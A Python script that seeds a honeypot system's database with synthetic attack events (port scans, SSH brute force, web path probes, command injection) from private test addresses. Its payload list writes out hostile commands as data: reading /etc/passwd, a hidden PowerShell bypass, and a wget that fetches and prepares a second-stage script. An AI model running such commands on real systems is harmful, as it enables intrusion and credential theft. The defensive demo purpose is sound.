#!/usr/bin/env python3
"""
Honeypot Trap System - Safe Demo Data Generator
Generates realistic, completely synthetic security events, detections, and alerts
using only private RFC-1918 test IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).
Does not interact with any external networks.
"""

import sys
import os
import random
from datetime import datetime, timedelta, timezone

# Add backend directory to sys.path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "backend"))

from app.core.database import SessionLocal, engine, Base
from app.core.init_db import init_db
from app.schemas.event import RawEventInput
from app.services.event_processor import event_processor
from app.core.logger import logger


SYNTHETIC_IPS = [
    "192.168.1.105",
    "192.168.1.142",
    "10.0.0.54",
    "10.0.0.88",
    "172.16.4.12",
    "172.16.9.99",
    "192.168.2.200",
    "10.10.14.33",
    "10.10.14.75",
    "192.168.100.15"
]

SERVICES = [
    {"name": "SSH Honeypot", "port": 2222, "protocol": "TCP"},
    {"name": "HTTP Honeypot", "port": 8080, "protocol": "TCP"},
    {"name": "FTP Honeypot", "port": 2121, "protocol": "TCP"},
    {"name": "Generic TCP Listener", "port": 9999, "protocol": "TCP"}
]

HTTP_PROBES = [
    {"path": "/wp-login.php", "method": "POST", "body": "log=admin&pwd=admin123&wp-submit=Log+In", "agent": "Mozilla/5.0"},
    {"path": "/.env", "method": "GET", "body": "", "agent": "curl/7.81.0"},
    {"path": "/phpmyadmin/index.php", "method": "GET", "body": "", "agent": "sqlmap/1.6"},
    {"path": "/actuator/env", "method": "GET", "body": "", "agent": "Mozilla/5.0"},
    {"path": "/api/v1/auth/login", "method": "POST", "body": '{"user":"root","pass":"toor"}', "agent": "python-requests/2.31"},
    {"path": "/manager/html", "method": "GET", "body": "", "agent": "Nikto/2.1.6"},
    {"path": "/index.html", "method": "GET", "body": "", "agent": "Mozilla/5.0 (Windows NT 10.0; Win64)"},
    {"path": "/robots.txt", "method": "GET", "body": "", "agent": "Googlebot-Image/1.0"},
]

SSH_PROBES = [
    {"user": "root", "payload": "SSH-2.0-libssh_0.9.5"},
    {"user": "admin", "payload": "SSH-2.0-OpenSSH_8.2p1"},
    {"user": "ubuntu", "payload": "SSH-2.0-Putty_Release_0.76"},
    {"user": "test", "payload": "SSH-2.0-Paramiko_2.8.0"},
    {"user": "support", "payload": "SSH-2.0-Go"},
]

FTP_PROBES = [
    {"user": "anonymous", "pass": "guest@test.com"},
    {"user": "administrator", "pass": "admin123"},
    {"user": "backup", "pass": "backup2024"},
    {"user": "ftpuser", "pass": "123456"},
]

COMMAND_PAYLOADS = [
    "cat /etc/passwd",
    "uname -a && id",
    "whoami",
    "powershell.exe -NoP -NonI -W Hidden -Exec Bypass",
    "wget http://10.0.0.99/stage2.sh -O /tmp/s; chmod +x /tmp/s",
    "systeminfo",
    "curl -s http://10.0.0.99/check_in",
]


def generate_demo_dataset(count: int = 120):
    print(f"[*] Initializing database for demo dataset generation...")
    init_db()
    db = SessionLocal()

    print(f"[*] Generating {count} synthetic security events across private RFC-1918 test subnets...")
    generated_count = 0

    try:
        # 1. Generate normal baseline events
        for _ in range(count // 3):
            ip = random.choice(SYNTHETIC_IPS)
            svc = random.choice(SERVICES)
            event_processor.process_raw_event(
                RawEventInput(
                    source_ip=ip,
                    source_port=random.randint(30000, 65000),
                    destination_port=svc["port"],
                    protocol=svc["protocol"],
                    service=svc["name"],
                    event_type="CONNECTION",
                    metadata={"synthetic": True, "connection_state": "established"}
                ),
                db
            )
            generated_count += 1

        # 2. Generate Web Exploitation / Path Scanning Burst (IP: 192.168.1.105 & 10.10.14.75)
        scanner_ip = "192.168.1.105"
        for probe in HTTP_PROBES:
            event_processor.process_raw_event(
                RawEventInput(
                    source_ip=scanner_ip,
                    source_port=random.randint(30000, 65000),
                    destination_port=8080,
                    protocol="TCP",
                    service="HTTP Honeypot",
                    event_type="SUSPICIOUS_REQUEST" if "env" in probe["path"] or "phpmyadmin" in probe["path"] or "Nikto" in probe["agent"] else "HTTP_REQUEST",
                    metadata={"path": probe["path"], "method": probe["method"], "user_agent": probe["agent"]},
                    raw_payload=f"{probe['method']} {probe['path']} HTTP/1.1\r\nUser-Agent: {probe['agent']}\r\n\r\n{probe['body']}"
                ),
                db
            )
            generated_count += 1

        # 3. Generate SSH Brute Force Campaign (IP: 10.0.0.54)
        brute_ip = "10.0.0.54"
        for probe in SSH_PROBES:
            for _ in range(2):
                event_processor.process_raw_event(
                    RawEventInput(
                        source_ip=brute_ip,
                        source_port=random.randint(30000, 65000),
                        destination_port=2222,
                        protocol="TCP",
                        service="SSH Honeypot",
                        event_type="FAILED_LOGIN",
                        metadata={"attempted_user": probe["user"], "auth_result": "rejected"},
                        raw_payload=f"Authentication probe for user '{probe['user']}' from {probe['payload']}"
                    ),
                    db
                )
                generated_count += 1

        # 4. Generate Port Scan Reconnaissance (IP: 172.16.4.12)
        port_scan_ip = "172.16.4.12"
        for port in [21, 22, 80, 443, 2121, 2222, 8080, 9999]:
            event_processor.process_raw_event(
                RawEventInput(
                    source_ip=port_scan_ip,
                    source_port=random.randint(40000, 60000),
                    destination_port=port,
                    protocol="TCP",
                    service="Generic TCP Listener" if port not in [2222, 8080, 2121] else ("SSH Honeypot" if port == 2222 else "HTTP Honeypot"),
                    event_type="PORT_SCAN",
                    metadata={"scan_syn": True, "window_size": 1024}
                ),
                db
            )
            generated_count += 1

        # 5. Generate Command Injection Probes (IP: 10.10.14.33)
        cmd_ip = "10.10.14.33"
        for cmd in COMMAND_PAYLOADS:
            event_processor.process_raw_event(
                RawEventInput(
                    source_ip=cmd_ip,
                    source_port=random.randint(30000, 65000),
                    destination_port=8080,
                    protocol="TCP",
                    service="HTTP Honeypot",
                    event_type="COMMAND_ATTEMPT",
                    metadata={"injected_param": "cmd", "execution_context": "simulated_sandbox"},
                    raw_payload=f"GET /shell.php?cmd={cmd} HTTP/1.1\r\nUser-Agent: curl/7.68.0"
                ),
                db
            )
            generated_count += 1

        # 6. Generate Multi-service Targeting (IP: 192.168.100.15)
        multi_ip = "192.168.100.15"
        for svc in SERVICES:
            event_processor.process_raw_event(
                RawEventInput(
                    source_ip=multi_ip,
                    source_port=random.randint(30000, 65000),
                    destination_port=svc["port"],
                    protocol=svc["protocol"],
                    service=svc["name"],
                    event_type="CONNECTION",
                    metadata={"handshake": "complete"}
                ),
                db
            )
            generated_count += 1

        print(f"[+] Successfully populated database with {generated_count} synthetic telemetry events!")
        print(f"[+] Multiple detection rules triggered, risk scores computed, and alerts stored.")

    finally:
        db.close()


if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 120
    generate_demo_dataset(count)
